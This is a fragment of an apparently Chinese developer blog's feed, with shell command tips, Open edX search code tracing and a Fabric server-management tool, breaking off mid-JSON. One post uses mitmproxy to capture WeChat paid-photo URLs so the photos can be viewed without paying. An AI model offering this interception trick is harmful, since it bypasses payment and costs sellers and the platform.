&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;&lt;a href="https://github.com/denysdovhan/bash-handbook#using-an-if-statement"&gt;逻辑判断&lt;/a&gt;&lt;/h1&gt;
&lt;h3&gt;常见用法&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;if [[ 2 -ne 1 ]]; then
  echo &amp;quot;true&amp;quot;
else
  echo &amp;quot;false&amp;quot;
fi
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;实用案例&lt;/h1&gt;
&lt;h3&gt;递归替换&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;grep -rl 'ajax.googleapis.com' ./ | xargs sed -i 's#ajax.googleapis.com#ajax.useso.com#g'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;作用 : 把./目录及其子目录下的&lt;code&gt;ajax.googleapis.com&lt;/code&gt;替换为&lt;code&gt;ajax.useso.com&lt;/code&gt;(实用360CDN替换google CDN)&lt;/p&gt;
&lt;p&gt;解释：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-r : 递归
-l : 只列出文件名
xargs : 拼接命令
-i : sed 原地替换
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;批量生成文件&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;touch (seq -f "%03g-1.mp3" 1 10)&lt;/code&gt;(fish下用()替代$()) &lt;/p&gt;
&lt;p&gt;批量生成001-1.mp3到010-1.mp3&lt;/p&gt;
&lt;h1&gt;date&lt;/h1&gt;
&lt;h3&gt;常见用法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;echo $(date +"%Y_%m_%d_%S") #2016_02_22_53&lt;/li&gt;
&lt;li&gt;echo $(date +"s") #从1970至今的秒数&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;tar&lt;/h1&gt;
&lt;h3&gt;常见用法&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tar -zcvf /tmp/etc.tar.gz /etc &lt;span class="c1"&gt;#打包后，以 gzip 压缩&lt;/span&gt;
tar -zxvf /tmp/etc.tar.gz &lt;span class="c1"&gt;#解压&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;du&lt;/h1&gt;
&lt;p&gt;du -hls * // 列出当前目录下所有文件/目录的大小
du -hls * | grep G //查找大目录&lt;/p&gt;
&lt;h1&gt;定时任务&lt;/h1&gt;
&lt;p&gt;cron用于例行性的任务，at用于一次性的任务&lt;/p&gt;
&lt;h3&gt;at&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;at now+1 minute
cowsay &amp;#39;hello at&amp;#39;  &amp;gt;/tmp/test
#atq 查看任务
# at -c 8 #查看数字对应任务的具体内容
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;mac下有问题:&lt;a href="http://superuser.com/questions/43678/mac-os-x-at-command-not-working"&gt;Mac OS X: at command not working&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;cron&lt;/h3&gt;
&lt;p&gt;sudo crontab -e&lt;/p&gt;
&lt;h3&gt;暂停并在后台运行命令&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CTRL + Z -暂停应用程序&lt;/li&gt;
&lt;li&gt;fg -重新将程序唤到前台&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://man.linuxde.net/grep"&gt;Linux命令大全&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 26 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-26:command-tricks.html</guid><category>dev-tools</category></item><item><title>使用mitmproxy查看红包照片</title><link>/mitmproxy-demo.html</link><description>&lt;h1&gt;微信红包照片&lt;/h1&gt;
&lt;p&gt;今天下午，微信朋友圈有个限时活动，发红包看照片，一时人山人海，秀恩爱都秀出了朦胧感与新高度，单身狗们纷纷付费被虐，场面空前惨烈。&lt;/p&gt;
&lt;p&gt;为响应动物保护协会号召，虽然我们做不到没有恩爱就没有伤害，但收费秀恩爱毕竟不太人道了，于是作为新世纪有爱心的码农，义不容辞地决定做些什么&lt;/p&gt;
&lt;h1&gt;mitmproxy&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;mitmproxy is an interactive, SSL-capable man-in-the-middle proxy for HTTP with a console interface.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;它可以用来拦截、修改、重放和保存 HTTP/HTTPS 请求。&lt;/p&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;pip install mitmproxy&lt;/p&gt;
&lt;h1&gt;Usage&lt;/h1&gt;
&lt;p&gt;在命令行里输入&lt;code&gt;mitmproxy -p 1234&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用ifconfig查看电脑的ip，之后将其填入手机代理&lt;/p&gt;
&lt;p&gt;&lt;img alt="mitmproxy0" src="img/wechat/mitmproxy0.png" /&gt;&lt;/p&gt;
&lt;p&gt;然后打开你的朋友圈，点击你想看的照片,mitmproxy就能抓取到它的url了&lt;/p&gt;
&lt;p&gt;&lt;img alt="mitmproxy1" src="img/wechat/mitmproxy1.png" /&gt;&lt;/p&gt;
&lt;p&gt;将此url复制到浏览器，不需付费也能被秀一脸恩爱啦233 &lt;/p&gt;
&lt;p&gt;哦对了 如果你在mac下，你需要按住option键再拖动鼠标才能复制&lt;/p&gt;
&lt;p&gt;&lt;img alt="mitmproxy2" src="img/wechat/mitmproxy2.png" /&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 26 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-26:mitmproxy-demo.html</guid><category>技术</category></item><item><title>edx search code analysis</title><link>/edx-search-code-analysis.html</link><description>&lt;p&gt;接着&lt;a href="http://blog.just4fun.site/edx-search-analysis.html"&gt;上篇文章&lt;/a&gt;我们继续往下走，在这里我们来跟踪源码，看看edx是如何利用elasticsearch来搜索课程/内容的&lt;/p&gt;
&lt;p&gt;首先在上篇文章里，我们知道了：在lms中搜索课程时，其实是发出ajax请求，而后&lt;code&gt;search&lt;/code&gt;服务响应这个请求，前台将其呈现给用户。这种设计在edx中随处可见，通过RESTful风格的接口，来将功能模块化。如此一来职责清晰，耦合度里，模块化高&lt;/p&gt;
&lt;h1&gt;定义目标&lt;/h1&gt;
&lt;p&gt;我们此次探索源码的目标是了解搜索相关的逻辑代码，看看适合在哪里开始定制。以及找到edx利用elasticsearch的机制，在那里我们可以将搜索问题变成elasticsearch的问题，借助elasticsearch，我们能获得惊人的搜索能力，elasticsearch有许多强大的插件，诸如中文分词插件，这对中文搜索很重要，对搜索的大动干戈建议从elasticsearch入手。&lt;/p&gt;
&lt;h1&gt;Go&lt;/h1&gt;
&lt;p&gt;我喜欢通过github读代码，有种破案推理的乐趣。当然啦更现代化的方法是使用Source Insight之类的工具或是使用打断点堆栈跟踪之类的方法&lt;/p&gt;
&lt;p&gt;我喜欢github是因为这种泛泛的搜索，常常有意外的收获，牺牲针精确换取更宽的视野。&lt;/p&gt;
&lt;p&gt;时有物外之趣&lt;/p&gt;
&lt;p&gt;下边开始我们的旅程。&lt;/p&gt;
&lt;p&gt;从上篇文章我们知道数据的来源是这几个url：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/search/&lt;/li&gt;
&lt;li&gt;/search/\&amp;lt;COURSE_ID&gt;&lt;/li&gt;
&lt;li&gt;/search/course_discovery&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们以此为切入点，首先定位到&lt;/p&gt;
&lt;p&gt;&lt;code&gt;url(r'^search/', include('search.urls')),&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个url会把我们引入&lt;a href="https://github.com/edx/edx-search"&gt;edx-search&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过url.py我们顺利找到&lt;a href="https://github.com/edx/edx-search/blob/master/search/urls.py#L13+L15"&gt;入口&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;    url(r&amp;#39;^$&amp;#39;, views.do_search, name=&amp;#39;do_search&amp;#39;),&lt;/span&gt;
&lt;span class="x"&gt;    url(r&amp;#39;^{}$&amp;#39;.format(COURSE_ID_PATTERN), views.do_search, name=&amp;#39;do_search&amp;#39;),&lt;/span&gt;
&lt;span class="x"&gt;    url(r&amp;#39;^course_discovery/$&amp;#39;, views.course_discovery, name=&amp;#39;course_discovery&amp;#39;),&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;顺藤摸瓜找到相关的view&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-search/blob/master/search/views.py#L49"&gt;do_search&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-search/blob/master/search/views.py#L147"&gt;course_discovery&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;跟踪内容搜素（&lt;code&gt;do_search&lt;/code&gt;）&lt;/h3&gt;
&lt;p&gt;我对搜索课程内容更感兴趣，所以先跟踪&lt;code&gt;do_search&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此外我们有个意外的发现，搜索会触发track.emit,这意味着搜索这个事件会被记录，之后在insights中可能会有显示&lt;/p&gt;
&lt;p&gt;不难发现&lt;a href="https://github.com/edx/edx-search/blob/master/search/views.py#L100"&gt;results&lt;/a&gt;是搜索所得的核心的数据，顺藤摸瓜，追踪到.api模块里的&lt;a href="https://github.com/edx/edx-search/blob/master/search/api.py#L30"&gt;perform_search&lt;/a&gt;函数&lt;/p&gt;
&lt;p&gt;=&amp;gt; &lt;a href="https://github.com/edx/edx-search/blob/master/search/api.py#L44"&gt;searcher&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;=&amp;gt; &lt;a href="https://github.com/edx/edx-search/blob/master/search/search_engine_base.py#L8"&gt;SearchEngine&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们看到这是一个抽象类，许多方法有待实现&lt;/p&gt;
&lt;p&gt;=&amp;gt; &lt;a href="https://github.com/edx/edx-search/blob/master/search/search_engine_base.py#L45"&gt;get_search_engine&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;=&amp;gt; &lt;a href="https://github.com/edx/edx-search/blob/master/search/search_engine_base.py#L49"&gt;search_engine_class&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;SEARCH_ENGINE在&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/configuration/edx_search.html#supported-flags"&gt;Enabling Open edX Search&lt;/a&gt;里有提到，生产环境用的是&lt;code&gt;search.elastic.ElasticSearchEngine&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;=&amp;gt; &lt;a href="https://github.com/edx/edx-search/blob/master/search/elastic.py#L185"&gt;ElasticSearchEngine&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们如愿以偿地找到了&lt;a href="https://github.com/edx/edx-search/blob/master/search/elastic.py#L428"&gt;search&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;顺便我们还发现了&lt;a href="https://github.com/edx/edx-search/blob/master/search/elastic.py#L354"&gt;index&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;又经过了层层包装,都在&lt;a href="https://github.com/edx/edx-search/blob/master/search/elastic.py#L185"&gt;ElasticSearchEngine&lt;/a&gt;类里了（主要在&lt;a href="https://github.com/edx/edx-search/blob/master/search/elastic.py#L428"&gt;search&lt;/a&gt;里），把搜索参数最终传递给elasticsearch:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;            &lt;span class="n"&gt;es_response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_es&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
                &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;index_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;
            &lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们顺便跟踪一下&lt;code&gt;_es&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;=&amp;gt; self._es = getattr(settings, "ELASTIC_SEARCH_IMPL", Elasticsearch)(es_config)&lt;/p&gt;
&lt;p&gt;=&amp;gt; from elasticsearch import Elasticsearch&lt;/p&gt;
&lt;p&gt;最后我们回到&lt;a href="https://github.com/elastic/elasticsearch-py"&gt;elasticsearch-py&lt;/a&gt;的&lt;a href="http://elasticsearch-py.readthedocs.org/en/master/api.html#elasticsearch.Elasticsearch.search"&gt;search&lt;/a&gt;方法，这样我们就把整个流程走完了&lt;/p&gt;
&lt;p&gt;至于&lt;a href="https://github.com/elastic/elasticsearch-py"&gt;elasticsearch-py&lt;/a&gt;如何封装elasticsearch，我觉得暂时可以不用关心&lt;/p&gt;
&lt;p&gt;中间的这个流程，任何一个环节我们都可能进行定制修改。&lt;/p&gt;
&lt;p&gt;enjoy it&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 21 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-21:edx-search-code-analysis.html</guid><category>edx</category></item><item><title>edx tools</title><link>/edx-tools.html</link><description>&lt;p&gt;在命令行下开发edx的小伙伴，可能有个困扰，每次需要&lt;code&gt;paver update_asset&lt;/code&gt;的时候都需要先&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -H -u edxapp bash
&lt;span class="nb"&gt;source&lt;/span&gt; /edx/app/edxapp/edxapp_env
&lt;span class="nb"&gt;cd&lt;/span&gt; /edx/app/edxapp/edx-platform
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;记性渣渣的我可记不住&lt;code&gt;-H -u&lt;/code&gt;这些乱七八糟的参数，所以写了一些简单的脚本来做这些重复性的工作。&lt;/p&gt;
&lt;p&gt;后来连服务器也懒得ssh登录了。我只是想看一下edx环境的依赖包版本，还要费半天劲先登录服务器，好烦&lt;/p&gt;
&lt;p&gt;所以用fabric写了可以远程操作服务器的工具脚本，用以简化一些无聊的工作。这样依赖我们可以在本地管理和调试远程edx服务器&lt;/p&gt;
&lt;p&gt;当前的版本还很简陋,不过常用功能已经有了，框架也已经出来了，欢迎大家来补充和拓展，仓库地址是:&lt;a href="https://github.com/wwj718/edx_tools"&gt;wwj718/edx_tools&lt;/a&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;edx tools&lt;/h1&gt;
&lt;p&gt;在本地管理和调试远程edx服务器&lt;/p&gt;
&lt;h1&gt;Install&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pip install fabric
git clone https://github.com/wwj718/edx_tools.git
&lt;span class="nb"&gt;cd&lt;/span&gt; edx_tools
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;setting&lt;/h1&gt;
&lt;p&gt;在settings.py里填写服务器的账户和密码&lt;/p&gt;
&lt;h1&gt;Usage&lt;/h1&gt;
&lt;h3&gt;查看所有可用指令&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;fab -f edx.py -l&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;查看服务器状态&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;fab -f edx.py status&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;重启edxapp&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;fab -f edx.py restart_edxapp&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;查看日志&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;查看最新10条lms日志：&lt;code&gt;fab -f edx.py tailLog 10,lms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看最新50条cms日志：&lt;code&gt;fab -f edx.py tailLog 50,cms&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;进入lms shell&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;fab -f edx.py shell&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;启用调试模式&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;fab -f edx.py devstack&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;编译静态文件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;编译lms：&lt;code&gt;fab -f edx.py update_assets:lms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;编译cms：&lt;code&gt;fab -f edx.py update_assets:cms&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;edxapp.pip&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;查看环境中有安装了哪些依赖库：&lt;code&gt;fab -f edx.py edxapp_pip&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 21 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-21:edx-tools.html</guid><category>edx</category></item><item><title>edx search analysis</title><link>/edx-search-analysis.html</link><description>&lt;p&gt;关于如何在Open edX中启用搜索特性可以参考我此前的评测文章:&lt;a href="http://blog.just4fun.site/try-open-edx-master-20151214.html"&gt;Open edX最新版评测与新特性探索(20151214)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;官方也给出了这个特性的介绍：&lt;a href="http://edx.readthedocs.org/projects/open-edx-learner-guide/en/latest/SFD_course_search.html"&gt;Searching the Course&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以及技术文档：&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/configuration/edx_search.html"&gt;Enabling Open edX Search&lt;/a&gt;,如你所料，它一如既往地变更频繁和不够完备。怎么说呢，如果你和我一样乐观，你大概会觉得这是好事吧，它意味着这个项目在被持续、迅猛地推进&lt;/p&gt;
&lt;h1&gt;Ready&lt;/h1&gt;
&lt;p&gt;关于edx search（这里重点谈论的是课程/内容搜索相关的部分），我们有个很有趣的想法，为了实现它，我们需要深入了解这个机制。而后在网上发现一些人也需要深度定制它。所以我将自己的分析过程分享出来，抛装引玉。也许能引来有趣的讨论，也许能帮到后来者，也许能给自己以启发&lt;/p&gt;
&lt;h1&gt;Go&lt;/h1&gt;
&lt;h3&gt;资源汇集&lt;/h3&gt;
&lt;p&gt;首先我们把能找到的资源进行汇集&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-search"&gt;edx-search&lt;/a&gt;:edx-search源码&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/tree/named-release/dogwood.rc/lms/lib/courseware_search"&gt;courseware_search&lt;/a&gt;:lms中相关源码&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/configuration/edx_search.html"&gt;Enabling Open edX Search&lt;/a&gt;：文档&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/open-edx-learner-guide/en/latest/SFD_course_search.html"&gt;Searching the Course&lt;/a&gt;:用户手册&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;阅读技术文档&lt;/h3&gt;
&lt;p&gt;通过阅读文档，我们大致了解了设计相关的信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-search"&gt;edx-search&lt;/a&gt;本质上是一个 Django application，用于与edx-platform通信&lt;/li&gt;
&lt;li&gt;搜索的过程是通过先创建索引，然后在索引里检索匹配信息，如果你熟悉ElasticSearch，你会觉得这个过程理所当然&lt;/li&gt;
&lt;li&gt;Python包依赖：Django、pyMongo、&lt;a href="https://github.com/newvem/pytz"&gt;pytz&lt;/a&gt;、elasticsearch&lt;/li&gt;
&lt;li&gt;索引数据由index_dictionary()方法决定，当前被索引的数据有：&lt;ul&gt;
&lt;li&gt;Sequence&lt;/li&gt;
&lt;li&gt;Vertical&lt;/li&gt;
&lt;li&gt;Video &lt;/li&gt;
&lt;li&gt;HTML Block&lt;/li&gt;
&lt;li&gt;也包括课程元信息，包括课程名、课程描述、以及课程开始、结束时间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LMS和CMS里有好些可开启的开关和可定制的信息，我摘录几个觉得重要的：&lt;ul&gt;
&lt;li&gt;指定引擎：SEARCH_ENGINE，当前支持ElasticSearchEngine和MockSearchEngine&lt;/li&gt;
&lt;li&gt;增加可搜索信息：ELASTIC_FIELD_MAPPINGS，该对象是一个自定，可自定拓展&lt;/li&gt;
&lt;li&gt;如果你想深度定制搜索：SEARCH_INITIALIZER、SEARCH_RESULT_PROCESSOR和SEARCH_FILTER_GENERATOR会是有用的接口&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;进一步分析edx相关的库我们可以了解到&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;edx中写搜索相关的业务逻辑，使用&lt;a href="https://github.com/elastic/elasticsearch-py"&gt;elasticsearch-py&lt;/a&gt;来操作elasticsearch&lt;/li&gt;
&lt;li&gt;edx的搜索用到了ElasticSearch，通过查阅&lt;a href="https://github.com/edx/configuration/"&gt;edx/configuration&lt;/a&gt;,我们发现Birch、Cypress和Dogwood使用的版本都是0.90.11&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;定制思路&lt;/h3&gt;
&lt;p&gt;通过前头的初步分析（注意我们还没有进入源码！我们已经初步了解课程搜索相关的设计了，可见阅读文档的重要性），我们大致知道了可以通过实现接口来实现自己的搜索逻辑，其中有三个接口是关键的，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SEARCH_INITIALIZER，源码见&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/lib/courseware_search/lms_search_initializer.py#L15"&gt;LmsSearchInitializer&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;lms.lib.courseware_search.lms_search_initializer.LmsSearchInitializer&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SEARCH_RESULT_PROCESSOR,源码见&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/lib/courseware_search/lms_result_processor.py#L15"&gt;LmsSearchResultProcessor&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;lms.lib.courseware_search.lms_result_processor.LmsSearchResultProcessor&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SEARCH_FILTER_GENERATOR,源码见&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/lib/courseware_search/lms_filter_generator.py#L17"&gt;LmsSearchFilterGenerator&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;lms.lib.courseware_search.lms_filter_generator.LmsSearchFilterGenerato」r&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;眼见为实&lt;/h3&gt;
&lt;p&gt;我们首先将devstack跑起来（实际上是在生产环境下）：
&lt;code&gt;sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms runserver 0.0.0.0:5000 --settings devstack&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;课程搜索包括三个部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;course discovery&lt;/li&gt;
&lt;li&gt;all course search&lt;/li&gt;
&lt;li&gt;single course search&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;首先是course discovery，我们据此来搜索需要的课程
&lt;img alt="course_discovery0" src="/img/edx/search/course_discovery0.png" /&gt;&lt;/p&gt;
&lt;p&gt;通过调试面板来看看实际的请求时怎样的
&lt;img alt="course_discovery1" src="/img/edx/search/course_discovery1.png" /&gt;&lt;/p&gt;
&lt;p&gt;搜索实际是一个RESTful 风格的API，以ajax的方式整合到页面里，我们稍后会跟踪这个接口&lt;/p&gt;
&lt;p&gt;我们接着看看all course search部分
&lt;img alt="all_course_search0.png" src="/img/edx/search/all_course_search0.png" /&gt;&lt;/p&gt;
&lt;p&gt;同样打开调试面板
&lt;img alt="all_course_search1.png" src="/img/edx/search/all_course_search1.png" /&gt;&lt;/p&gt;
&lt;p&gt;我们可以看到接口的url，以POST方式发送搜索请求&lt;/p&gt;
&lt;p&gt;随时来看看课程被的搜索（single course search）&lt;/p&gt;
&lt;p&gt;&lt;img alt="single_course_search0.png" src="/img/edx/search/single_course_search0.png" /&gt;&lt;/p&gt;
&lt;p&gt;观察调试面板可以发现，实际是以以POST方式请求http://ip:5000/search/course-v1:edX+DemoX+Demo_Course&lt;/p&gt;
&lt;p&gt;response为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;access_denied_count&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;total&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;max_score&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.6223112&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;took&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;results&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;_type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;courseware_content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;score&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.6223112&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;courseware_index&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_score&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.6223112&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;block-v1:edX+DemoX+Demo_Course+type@html+block@2bee8c4248e842a19ba1e73ed8d426c2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;course_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;edX Demonstration Course&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;url&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/courses/course-v1:edX+DemoX+Demo_Course/jump_to/block-v1:edX+DemoX+Demo_Course+type@html+block@2bee8c4248e842a19ba1e73ed8d426c2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;&amp;quot;excerpt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;b&amp;gt;Lab&amp;lt;/b&amp;gt;s and Demos Professors that create courses on edX are able to&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span 